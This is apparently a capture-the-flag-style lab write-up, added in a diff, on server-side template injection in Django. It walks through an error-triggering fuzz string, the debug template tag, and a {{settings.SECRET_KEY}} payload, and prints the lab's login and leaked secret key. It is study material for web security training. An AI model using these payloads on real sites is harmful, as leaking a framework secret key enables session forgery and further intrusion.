@@ -1,0 +1,70 @@
+// Lab: Server-side template injection with information disclosure via user-supplied objects
+
+
+
+This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
+
+To solve the lab, steal and submit the framework's secret key.
+
+You can log in to your own account using the following credentials:
+
+content-manager:C0nt3ntM4n4g3r.
+
+
+
+
+// Solution
+
+Take the Reference from the Github repo:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#django---debug-information-leak
+
+
+and this docs:
+
+https://docs.djangoproject.com/en/6.0/ref/settings/#std-setting-SECRET_KEY
+
+
+
+// Steps to Solve
+
+
+1. Log in and edit one of the product description templates.
+
+
+2. Edit the template by Injecting the following code:
+
+${{<%[%'"}}%\
+
+we get the information in the form of error:
+
+Internal Server Error
+
+Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '<%[%'"' from '<%[%'"'
+
+
+3. Study the Django documentation and notice that the built-in template tag debug can be called to display debugging information.
+
+
+4. In the template, remove your invalid syntax and enter the following statement to invoke the debug built-in:
+
+{% debug %}
+
+
+5. Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the settings object.
+
+
+6. Now study the settings SECRET_KEY in django docs
+
+
+7. Now Inject the following code in the template:
+
+{{settings.SECRET_KEY}}
+
+
+8. Now we get the SECRET_KEY:
+
+8610t02noi4ztf85gqb41hxf7t7691kv
+
+
+9. Submit the the SECRET_KEY and the lab is solved.
